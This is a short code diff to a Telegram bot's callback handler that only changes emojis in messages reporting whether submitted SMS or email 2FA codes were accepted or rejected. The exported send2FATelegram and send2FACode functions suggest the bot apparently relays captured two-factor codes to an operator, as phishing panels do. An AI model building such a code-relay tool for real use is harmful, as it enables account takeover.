@@ -249,7 +249,7 @@ bot.on("callback_query", async (query) => {
       const displayCode = smsMatch ? smsMatch[1].trim() : null;
 
       const twoFaStatusText = displayCode
-        ? `💬 <code>${displayCode}</code> has been <b>${twoFaStatus === "approved" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
+        ? `🔐 <code>${displayCode}</code> has been <b>${twoFaStatus === "approved" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
         : `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`;
 
       await bot.sendMessage(
@@ -335,7 +335,7 @@ bot.on("callback_query", async (query) => {
     } else {
       const isSMS = /^\d+$/.test(identifier);
       replyText = isSMS
-        ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
+        ? `🔐 <code>${identifier}</code> has been <b>${actionLabel}</b>`
         : `📧 <code>${identifier}</code> has been <b>${actionLabel}</b>`;
     }
 
@@ -375,4 +375,5 @@ module.exports = {
   send2FATelegram,
   send2FACode
 };
+
 
